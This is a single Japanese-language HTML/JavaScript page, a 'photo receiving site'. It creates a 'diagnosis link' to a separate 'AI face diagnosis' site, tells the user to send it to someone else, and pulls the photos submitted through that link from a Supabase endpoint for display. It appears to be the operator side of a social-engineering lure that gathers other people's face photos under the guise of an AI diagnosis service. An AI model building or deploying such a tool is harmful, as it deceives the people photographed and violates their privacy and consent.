```html
<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>写真受信サイト</title>

<style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  min-height: 100vh;

  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "Segoe UI",
    sans-serif;

  background:
    linear-gradient(
      135deg,
      #111827,
      #312e81,
      #581c87
    );

  color: #222;
}

.container {
  max-width: 500px;
  margin: 0 auto;

  background: white;

  padding: 25px;

  border-radius: 24px;

  box-shadow:
    0 10px 40px
    rgba(0, 0, 0, 0.35);
}

h1 {
  margin-top: 0;
  text-align: center;
}

p {
  line-height: 1.6;
}

button {
  width: 100%;

  padding: 15px;

  margin-top: 12px;

  border: none;

  border-radius: 12px;

  background: #111827;

  color: white;

  font-size: 16px;

  cursor: pointer;
}

button:disabled {
  background: #999;
  cursor: default;
}

.copyButton {
  background:
    linear-gradient(
      135deg,
      #4f46e5,
      #9333ea
    );
}

.openButton {
  background: #059669;
}

.refreshButton {
  background: #2563eb;
}

.linkBox {
  margin-top: 20px;

  padding: 15px;

  background: #f3f4f6;

  border-radius: 15px;

  word-break: break-all;
}

.linkText {
  font-size: 14px;

  color: #4b5563;

  margin-top: 8px;
}

.small {
  font-size: 13px;
  color: #666;
}

.message {
  margin-top: 20px;

  padding: 12px;

  border-radius: 12px;

  background: #f3f4f6;

  text-align: center;
}

.photoArea {
  margin-top: 20px;
}

.photoItem {
  margin-top: 20px;

  padding: 15px;

  background: #f5f5f7;

  border-radius: 15px;
}

.photoItem p {
  font-weight: bold;
}

.photo {
  display: block;

  width: 100%;

  height: auto;

  border-radius: 12px;

  margin-top: 10px;
}

.hidden {
  display: none;
}

.roomInfo {
  margin-top: 15px;

  padding: 12px;

  background: #faf5ff;

  border-radius: 12px;

  font-size: 13px;

  word-break: break-all;
}

</style>
</head>


<body>

<div class="container">

<h1>📷 写真受信サイト</h1>

<p>
このサイトで専用リンクを作成できます。
</p>

<p class="small">
作成したリンクから送信された写真を、
このブラウザの専用ルームで確認できます。
</p>


<button id="createButton">
🔗 リンクを作成
</button>


<div
  id="linkArea"
  class="linkBox hidden"
>

<strong>
あなたの診断リンク
</strong>

<div
  id="linkText"
  class="linkText"
></div>


<button
  id="copyButton"
  class="copyButton"
>
📋 リンクをコピー
</button>


<button
  id="openButton"
  class="openButton"
>
🌐 AI顔診断サイトを開く
</button>


</div>


<div
  id="roomInfo"
  class="roomInfo hidden"
>
ルームID：
<span id="roomText"></span>
</div>


<button
  id="refreshButton"
  class="refreshButton"
>
🔄 写真を確認
</button>


<div
  id="message"
  class="message"
>
まだ写真を確認していません。
</div>


<div
  id="photoArea"
  class="photoArea"
></div>


</div>


<script>


/* =========================
   設定
========================= */


const FUNCTION_URL =
  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";


const AI_SITE =
  "https://gaffney16445.github.io/ai-face-diagnosis/";


const STORAGE_KEY =
  "receiverRoom";


/* =========================
   HTML取得
========================= */


const createButton =
  document.getElementById(
    "createButton"
  );


const copyButton =
  document.getElementById(
    "copyButton"
  );


const openButton =
  document.getElementById(
    "openButton"
  );


const refreshButton =
  document.getElementById(
    "refreshButton"
  );


const linkArea =
  document.getElementById(
    "linkArea"
  );


const linkText =
  document.getElementById(
    "linkText"
  );


const roomInfo =
  document.getElementById(
    "roomInfo"
  );


const roomText =
  document.getElementById(
    "roomText"
  );


const message =
  document.getElementById(
    "message"
  );


const photoArea =
  document.getElementById(
    "photoArea"
  );


/* =========================
   現在のルーム
========================= */


let room =
  localStorage.getItem(
    STORAGE_KEY
  ) || "";


let currentLink =
  "";


/* =========================
   ルームID作成
========================= */


function createRoomId() {

  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";

  for (
    let i = 0;
    i < 12;
    i++
  ) {

    result +=
      characters[
        Math.floor(
          Math.random() *
          characters.length
        )
      ];

  }

  return result;
}


/* =========================
   ルーム表示
========================= */


function showRoom() {

  if (!room) {

    linkArea.classList.add(
      "hidden"
    );

    roomInfo.classList.add(
      "hidden"
    );

    return;

  }


  currentLink =
    AI_SITE +
    "?room=" +
    encodeURIComponent(
      room
    );


  linkText.textContent =
    currentLink;


  roomText.textContent =
    room;


  linkArea.classList.remove(
    "hidden"
  );


  roomInfo.classList.remove(
    "hidden"
  );

}


/* =========================
   リンク作成
========================= */


createButton.addEventListener(
  "click",
  () => {

    room =
      createRoomId();


    localStorage.setItem(
      STORAGE_KEY,
      room
    );


    showRoom();


    message.textContent =
      "リンクを作成しました。相手にこのリンクを送ってください。";

  }
);


/* =========================
   コピー
========================= */


copyButton.addEventListener(
  "click",
  async () => {

    if (!currentLink) {

      message.textContent =
        "先にリンクを作成してください。";

      return;

    }


    try {

      await navigator.clipboard.writeText(
        currentLink
      );


      message.textContent =
        "リンクをコピーしました！";

    } catch (error) {

      console.error(
        error
      );


      message.textContent =
        "コピーできませんでした。リンクを長押ししてコピーしてください。";

    }

  }
);


/* =========================
   AIサイトを開く
========================= */


openButton.addEventListener(
  "click",
  () => {

    if (!currentLink) {

      message.textContent =
        "先にリンクを作成してください。";

      return;

    }


    window.open(
      currentLink,
      "_blank"
    );

  }
);


/* =========================
   写真確認
========================= */


refreshButton.addEventListener(
  "click",
  async () => {

    if (!room) {

      message.textContent =
        "先に「リンクを作成」を押してください。";

      return;

    }


    refreshButton.disabled =
      true;


    refreshButton.textContent =
      "読み込み中...";


    message.textContent =
      "写真を確認しています...";


    photoArea.innerHTML =
      "";


    try {

      const response =
        await fetch(
          FUNCTION_URL +
          "?room=" +
          encodeURIComponent(
            room
          ),
          {
            method:
              "GET"
          }
        );


      const responseText =
        await response.text();


      if (!response.ok) {

        console.error(
          "GET ERROR:",
          response.status,
          responseText
        );


        throw new Error(
          "HTTP " +
          response.status
        );

      }


      let data;


      try {

        data =
          JSON.parse(
            responseText
          );

      } catch (error) {

        console.error(
          "JSON ERROR:",
          responseText
        );

        throw new Error(
          "JSONを読み込めませんでした"
        );

      }


      console.log(
        "PHOTO DATA:",
        data
      );


      if (
        !data.success
      ) {

        throw new Error(
          data.error ||
          "写真取得に失敗しました"
        );

      }


      if (
        !Array.isArray(
          data.photos
        ) ||
        data.photos.length === 0
      ) {

        message.textContent =
          "まだ写真は届いていません。";

        return;

      }


      message.textContent =
        data.photos.length +
        "枚の写真を受信しています。";


      data.photos.forEach(
        (photo, index) => {

          const item =
            document.createElement(
              "div"
            );


          item.className =
            "photoItem";


          const title =
            document.createElement(
              "p"
            );


          title.textContent =
            "📷 写真 " +
            (index + 1);


          const image =
            document.createElement(
              "img"
            );


          image.className =
            "photo";


          image.src =
            photo.url;


          image.alt =
            "受信した写真";


          image.loading =
            "lazy";


          image.addEventListener(
            "error",
            () => {

              image.alt =
                "写真を表示できませんでした";

              image.style.display =
                "none";


              const errorText =
                document.createElement(
                  "p"
                );


              errorText.textContent =
                "この写真を表示できませんでした。";


              item.appendChild(
                errorText
              );

            }
          );


          item.appendChild(
            title
          );


          item.appendChild(
            image
          );


          photoArea.appendChild(
            item
          );

        }
      );


    } catch (error) {

      console.error(
        "PHOTO ERROR:",
        error
      );


      message.textContent =
        "写真を取得できませんでした。";


    } finally {

      refreshButton.disabled =
        false;


      refreshButton.textContent =
        "🔄 写真を確認";

    }

  }
);


/* =========================
   前回のルームを復元
========================= */


showRoom();


</script>

</body>
</html>
